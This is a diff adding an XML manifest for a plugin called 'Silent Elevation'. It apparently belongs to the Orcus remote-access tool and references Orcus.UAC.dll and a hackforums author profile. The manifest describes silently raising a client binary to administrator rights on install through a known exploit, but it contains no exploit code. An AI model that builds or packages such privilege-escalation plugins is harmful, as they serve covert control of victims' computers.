@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<PluginInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Name>Silent Elevation</Name>
+  <Description>Silent elevates the client binary to administrative privileges upon installing. This utitilizes a well known exploit by the Red Team security research group.</Description>
+  <Author>Nick (Name)</Author>
+  <AuthorUrl>https://hackforums.net/member.php?action=profile&amp;uid=2918763</AuthorUrl>
+  <Guid>0a189c79-87ca-4d8d-bfb5-fac811f4048e</Guid>
+  <Version>
+    <Major>1</Major>
+    <Minor>5</Minor>
+  </Version>
+  <Thumbnail>thumbnail.png</Thumbnail>
+  <PluginType>Client</PluginType>
+  <Library1>Orcus.UAC.dll</Library1>
+</PluginInfo>
